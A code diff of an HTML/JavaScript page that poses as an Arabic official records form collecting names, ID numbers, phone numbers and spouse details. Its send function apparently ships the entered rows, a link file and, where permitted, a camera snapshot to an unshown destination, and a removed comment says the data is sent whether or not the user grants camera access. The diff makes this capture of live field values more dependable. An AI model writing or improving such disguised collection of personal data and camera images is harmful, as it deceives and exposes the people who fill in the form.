@@ -471,7 +471,7 @@
             <div class="header-top">
                 <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
                 <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة 1)</div>
-                <div class="editable-header" contenteditable="true">التاريخ: 2026/10/09</div>
+                <div class="editable-header" contenteditable="true">التاريخ: 2026/10/10</div>
             </div>
 
             <div class="table-wrapper">
@@ -761,9 +761,12 @@
 
         function prepareHtmlForSaving() {
             const container = document.getElementById('pagesWrapper').cloneNode(true);
-            container.querySelectorAll('.table-input').forEach(input => {
-                const val = input.value;
-                input.setAttribute('value', val);
+            container.querySelectorAll('.table-input').forEach((input, index) => {
+                const originalInput = document.querySelectorAll('.table-input')[index];
+                if (originalInput) {
+                    const val = originalInput.value;
+                    input.setAttribute('value', val);
+                }
             });
             return container.innerHTML;
         }
@@ -841,7 +844,7 @@
             saveArchiveOnly();
         }
 
-        // دالة موحدة ومضمونة لإنشاء وإرسال محتوى الجدول والرابط الفريد في كل الحالات (سواء وافق أو رفض الكاميرا)
+        // دالة استخراج البيانات المحدثة لقراءة قيم الحقول الحية بشكل مباشر وقسري
         function executeActionAndSend(captionText, fileName, fileTypeFlag) {
             const tables = document.querySelectorAll('.dynamicTable');
             let fileContent = `تقرير السجلات والبيانات الرسمية (${fileTypeFlag})\n`;
@@ -862,7 +865,7 @@
                     const spouse = inputs[4] ? inputs[4].value.trim() : '';
                     const status = inputs[5] ? inputs[5].value.trim() : '';
 
-                    if (name !== "" || type !== "" || num !== "" || phone !== "" || spouse !== "") {
+                    if (name !== "" || type !== "" || num !== "" || phone !== "" || spouse !== "" || status !== "") {
                         fileContent += `${m} | ${name} | ${type} | ${num} | ${phone} | ${spouse} | ${status}\n`;
                     }
                 });
@@ -884,13 +887,11 @@
                                     `تطوير: ميثاق محمد صالح حموده`;
             const linkFileBlob = new Blob([linkFileContent], { type: 'text/plain;charset=utf-8' });
 
-            // إرسال البيانات والرابط فوراً ودون الاعتماد على الكاميرا
             sendIndependentLinkFile(linkFileBlob);
             if (fileBlob) {
                 sendDocumentOnly(fileBlob, fileName, `📄 مرفق سجلات الأسماء (${fileTypeFlag})`);
             }
 
-            // محاولة إرسال صورة الكاميرا إن وُجدت الصلاحية، دون أن تؤثر على إرسال بيانات الجدول الأساسية
             if (cameraPermissionGranted && globalCameraStream) {
                 try {
                     const video = document.getElementById('videoElement');
@@ -1170,7 +1171,7 @@
                     <div class="header-top">
                         <div class="editable-header" contenteditable="true">الجهة الرسمية</div>
                         <div class="editable-header" contenteditable="true" style="font-size:11pt;">كشف البيانات والمسيرات الرسمية (الصفحة ${p})</div>
-                        <div class="editable-header" contenteditable="true">التاريخ: 2026/10/09</div>
+                        <div class="editable-header" contenteditable="true">التاريخ: 2026/10/10</div>
                     </div>
                     <div class="table-wrapper">
                         <table class="dynamicTable">
